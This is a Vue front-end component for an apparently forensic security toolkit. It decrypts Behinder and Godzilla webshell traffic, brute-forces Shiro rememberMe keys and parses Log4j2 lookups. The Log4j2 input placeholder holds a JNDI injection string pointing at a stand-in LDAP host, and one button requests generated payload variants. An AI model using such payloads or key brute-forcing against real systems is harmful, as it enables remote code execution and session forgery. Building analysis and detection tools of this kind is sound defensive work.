<template>
  <n-card :bordered="false" class="proCard" :title="cardTitle">
    <!-- 冰蝎 -->
    <div v-show="activeTab === 'behinder'" class="py-4">
      <n-form label-placement="left" :label-width="90">
        <n-form-item label="流量内容">
          <n-input
            v-model:value="behinderForm.data"
            type="textarea"
            placeholder="冰蝎加密流量（请求体为base64，响应体为hex）"
            :autosize="{ minRows: 4, maxRows: 10 }"
          />
        </n-form-item>
        <n-form-item label="连接密码">
          <n-input v-model:value="behinderForm.pass" placeholder="留空使用默认密码 rebeyond" />
        </n-form-item>
        <n-form-item label="方向">
          <n-radio-group v-model:value="behinderForm.direction">
            <n-radio value="auto">自动</n-radio>
            <n-radio value="c2s">客户端→服务端</n-radio>
            <n-radio value="s2c">服务端→客户端</n-radio>
          </n-radio-group>
        </n-form-item>
        <n-space>
          <n-button type="primary" :loading="loading" @click="doBehinder">解密</n-button>
          <n-dropdown trigger="click" :options="behinderSampleOptions" @select="fillBehinderSample">
            <n-button :loading="sampleLoading">示例</n-button>
          </n-dropdown>
        </n-space>
      </n-form>
      <n-alert v-if="behinderRes" :type="behinderRes.ok ? 'success' : 'warning'" class="mt-4" closable @close="behinderRes = null">
        <template #header>{{ behinderRes.title }}</template>
        <div v-if="behinderRes.meta" class="mb-2">{{ behinderRes.meta }}</div>
        <pre v-if="behinderRes.output" class="result-pre">{{ behinderRes.output }}</pre>
      </n-alert>
    </div>

    <!-- 哥斯拉 -->
    <div v-show="activeTab === 'godzilla'" class="py-4">
      <n-form label-placement="left" :label-width="90">
        <n-form-item label="流量内容">
          <n-input
            v-model:value="godzillaForm.data"
            type="textarea"
            placeholder="哥斯拉加密流量（base64 / hex / 原始字节）"
            :autosize="{ minRows: 4, maxRows: 10 }"
          />
        </n-form-item>
        <n-form-item label="连接密码">
          <n-input v-model:value="godzillaForm.pass" placeholder="连接密码 pass" />
        </n-form-item>
        <n-form-item label="密钥">
          <n-input v-model:value="godzillaForm.key" placeholder="哥斯拉配置的 key（加密密钥）" />
        </n-form-item>
        <n-form-item label="加密方式">
          <n-select
            v-model:value="godzillaForm.enc"
            :options="godzillaEncOptions"
            style="max-width: 320px"
          />
        </n-form-item>
        <n-space>
          <n-button type="primary" :loading="loading" @click="doGodzilla">解密</n-button>
          <n-button :loading="sampleLoading" @click="fillGodzillaSample">示例</n-button>
        </n-space>
      </n-form>
      <n-alert v-if="godzillaRes" :type="godzillaRes.ok ? 'success' : 'warning'" class="mt-4" closable @close="godzillaRes = null">
        <template #header>{{ godzillaRes.title }}</template>
        <div v-if="godzillaRes.meta" class="mb-2">{{ godzillaRes.meta }}</div>
        <pre v-if="godzillaRes.output" class="result-pre">{{ godzillaRes.output }}</pre>
      </n-alert>
    </div>

    <!-- Shiro -->
    <div v-show="activeTab === 'shiro'" class="py-4">
      <n-form label-placement="left" :label-width="90">
        <n-form-item label="rememberMe">
          <n-input
            v-model:value="shiroForm.rememberMe"
            type="textarea"
            placeholder="rememberMe cookie 值（base64）"
            :autosize="{ minRows: 3, maxRows: 8 }"
          />
        </n-form-item>
        <n-form-item label="密钥">
          <n-input v-model:value="shiroForm.key" placeholder="留空则使用内置常用密钥字典爆破" />
        </n-form-item>
        <n-form-item label="加密模式">
          <n-radio-group v-model:value="shiroForm.mode">
            <n-radio value="auto">自动</n-radio>
            <n-radio value="cbc">AES-CBC (Shiro ≤1.4.1)</n-radio>
            <n-radio value="gcm">AES-GCM (Shiro 1.4.2+)</n-radio>
          </n-radio-group>
        </n-form-item>
        <n-space>
          <n-button type="primary" :loading="loading" @click="doShiro">检测</n-button>
          <n-button :loading="sampleLoading" @click="fillShiroSample">示例</n-button>
        </n-space>
      </n-form>
      <n-alert v-if="shiroRes" :type="shiroRes.ok ? 'success' : 'info'" class="mt-4" closable @close="shiroRes = null">
        <template #header>{{ shiroRes.title }}</template>
        <div v-if="shiroRes.detail" style="white-space: pre-wrap; word-break: break-all">{{ shiroRes.detail }}</div>
      </n-alert>
    </div>

    <!-- Log4j2 -->
    <div v-show="activeTab === 'log4j2'" class="py-4">
      <n-form label-placement="left" :label-width="90">
        <n-form-item label="payload">
          <n-input
            v-model:value="log4j2Form.payload"
            type="textarea"
            placeholder='${jndi:ldap://x.x.x.x:1389/Exploit}'
            :autosize="{ minRows: 3, maxRows: 8 }"
          />
        </n-form-item>
        <n-space>
          <n-button type="primary" :loading="loading" @click="doLog4j2Parse">解析</n-button>
          <n-button :loading="loading" @click="doLog4j2Gen">生成变体</n-button>
          <n-button :loading="sampleLoading" @click="fillLog4j2Sample">示例</n-button>
        </n-space>
      </n-form>
      <n-alert v-if="log4j2Res" :type="log4j2Res.ok ? 'success' : 'info'" class="mt-4" closable @close="log4j2Res = null">
        <template #header>{{ log4j2Res.title }}</template>
        <pre v-if="log4j2Res.output" class="result-pre">{{ log4j2Res.output }}</pre>
      </n-alert>
    </div>
  </n-card>
</template>

<script lang="ts" setup>
import { computed, reactive, ref, watch } from 'vue';
import { useRoute } from 'vue-router';
import { useMessage } from 'naive-ui';
import {
  bttBehinderDecrypt,
  bttGodzillaDecrypt,
  bttShiroCheck,
  bttLog4j2Parse,
  bttLog4j2Generate,
  bttSamples,
} from '@/api/table/list';

const message = useMessage();
const route = useRoute();
const loading = ref(false);

const TAB_TITLES: Record<string, string> = {
  behinder: '冰蝎流量解密',
  godzilla: '哥斯拉流量解密',
  shiro: 'Shiro密钥检测',
  log4j2: 'Log4j2',
};

const activeTab = computed(() => {
  const t = route.meta?.tab as string;
  return TAB_TITLES[t] ? t : 'behinder';
});
const cardTitle = computed(() => TAB_TITLES[activeTab.value] || '辅助工具');

// ===== 示例数据（后端现场生成，保证可解密/可检出） =====
const samples = ref<any>(null);
const sampleLoading = ref(false);

function loadSamples() {
  if (samples.value) {
    return Promise.resolve(samples.value);
  }
  sampleLoading.value = true;
  return bttSamples()
    .then((resp) => {
      samples.value = resp?.result?.result ?? resp?.result ?? {};
      return samples.value;
    })
    .catch(() => {
      message.error('示例数据获取失败');
      return {};
    })
    .finally(() => (sampleLoading.value = false));
}

const behinderSampleOptions = [
  { label: '客户端→服务端', key: 'behinder' },
  { label: '服务端→客户端', key: 'behinder_s2c' },
];

function fillBehinderSample(key: string) {
  loadSamples().then((s) => {
    const d = s?.[key];
    if (!d) return;
    behinderForm.data = d.data;
    behinderForm.pass = d.pass;
    behinderForm.direction = d.direction;
    doBehinder();
  });
}

function fillGodzillaSample() {
  loadSamples().then((s) => {
    const d = s?.godzilla;
    if (!d) return;
    godzillaForm.data = d.data;
    godzillaForm.pass = d.pass;
    godzillaForm.key = d.key;
    godzillaForm.enc = d.enc;
    doGodzilla();
  });
}

function fillShiroSample() {
  loadSamples().then((s) => {
    const d = s?.shiro;
    if (!d) return;
    shiroForm.rememberMe = d.rememberMe;
    shiroForm.key = d.key;
    shiroForm.mode = d.mode;
    doShiro();
  });
}

function fillLog4j2Sample() {
  loadSamples().then((s) => {
    const d = s?.log4j2;
    if (!d) return;
    log4j2Form.payload = d.payload;
    doLog4j2Parse();
  });
}

// ===== 冰蝎 =====
const behinderForm = reactive({ data: '', pass: '', direction: 'auto' });
const behinderRes = ref<any>(null);

function doBehinder() {
  if (!behinderForm.data) {
    message.error('请填写流量内容');
    return;
  }
  loading.value = true;
  bttBehinderDecrypt({ ...behinderForm })
    .then((resp) => {
      const r = resp?.result?.result;
      if (r && resp.result.code === 20000) {
        behinderRes.value = {
          ok: true,
          title: '解密成功',
          meta: `方向: ${r.direction} | 密钥: ${r.key} | 类型: ${r.note}`,
          output: r.output,
        };
      } else {
        behinderRes.value = { ok: false, title: resp?.result?.message || '解密失败' };
      }
    })
    .finally(() => (loading.value = false));
}

// ===== 哥斯拉 =====
const godzillaForm = reactive({ data: '', pass: '', key: '', enc: 'auto' });
const godzillaRes = ref<any>(null);
const godzillaEncOptions = [
  { label: '自动识别', value: 'auto' },
  { label: 'AES + Base64', value: 'aes_base64' },
  { label: 'AES + Raw/Hex', value: 'aes_raw' },
  { label: 'XOR + Base64', value: 'xor_base64' },
  { label: 'XOR + Raw/Hex', value: 'xor_raw' },
  { label: '仅 Base64（无加密）', value: 'base64' },
];

function doGodzilla() {
  if (!godzillaForm.data) {
    message.error('请填写流量内容');
    return;
  }
  loading.value = true;
  bttGodzillaDecrypt({ ...godzillaForm })
    .then((resp) => {
      const r = resp?.result?.result;
      if (r && resp.result.code === 20000) {
        godzillaRes.value = {
          ok: true,
          title: '解密成功',
          meta: `加密方式: ${r.enc}${r.key ? ' | 密钥: ' + r.key : ''} | 类型: ${r.note}`,
          output: r.output,
        };
      } else {
        godzillaRes.value = { ok: false, title: resp?.result?.message || '解密失败' };
      }
    })
    .finally(() => (loading.value = false));
}

// ===== Shiro =====
const shiroForm = reactive({ rememberMe: '', key: '', mode: 'auto' });
const shiroRes = ref<any>(null);

function doShiro() {
  if (!shiroForm.rememberMe) {
    message.error('请填写 rememberMe cookie');
    return;
  }
  loading.value = true;
  bttShiroCheck({ ...shiroForm })
    .then((resp) => {
      const j = resp?.result ?? {};
      const r = j.result;
      if (r && r.found) {
        shiroRes.value = {
          ok: true,
          title: `命中密钥: ${r.key}（${r.mode} 模式）`,
          detail: `尝试 ${r.total} 个密钥\n解密内容:\n${r.data}`,
        };
      } else {
        shiroRes.value = {
          ok: false,
          title: j.message || '未找到可用密钥',
          detail: r ? `已尝试 ${r.total} 个密钥` : '',
        };
      }
    })
    .finally(() => (loading.value = false));
}

// ===== Log4j2 =====
const log4j2Form = reactive({ payload: '' });
const log4j2Res = ref<any>(null);

function doLog4j2Parse() {
  if (!log4j2Form.payload) {
    message.error('请填写 payload');
    return;
  }
  loading.value = true;
  bttLog4j2Parse({ payload: log4j2Form.payload })
    .then((resp) => {
      const j = resp?.result ?? {};
      const r = j.result ?? {};
      const lines = (r.lookups || []).map(
        (l) => `${l.danger ? '[危险]' : '[信息]'} ${l.raw}\n  前缀: ${l.prefix}  值: ${l.value}${l.protocol ? '  协议: ' + l.protocol : ''}${l.target ? '  目标: ' + l.target : ''}`
      );
      log4j2Res.value = {
        ok: !!r.danger,
        title: j.message || '解析完成',
        output: lines.join('\n'),
      };
    })
    .finally(() => (loading.value = false));
}

function doLog4j2Gen() {
  loading.value = true;
  bttLog4j2Generate({ target: log4j2Form.payload })
    .then((resp) => {
      const j = resp?.result ?? {};
      const r = j.result ?? {};
      log4j2Res.value = {
        ok: true,
        title: `已生成 ${(r.payloads || []).length} 个变体`,
        output: (r.payloads || []).join('\n'),
      };
    })
    .finally(() => (loading.value = false));
}

// 路由切换时清空结果展示
watch(activeTab, () => {
  behinderRes.value = null;
  godzillaRes.value = null;
  shiroRes.value = null;
  log4j2Res.value = null;
});
</script>

<style lang="less" scoped>
.result-pre {
  white-space: pre-wrap;
  word-break: break-all;
  max-height: 420px;
  overflow: auto;
  font-size: 12px;
}
</style>
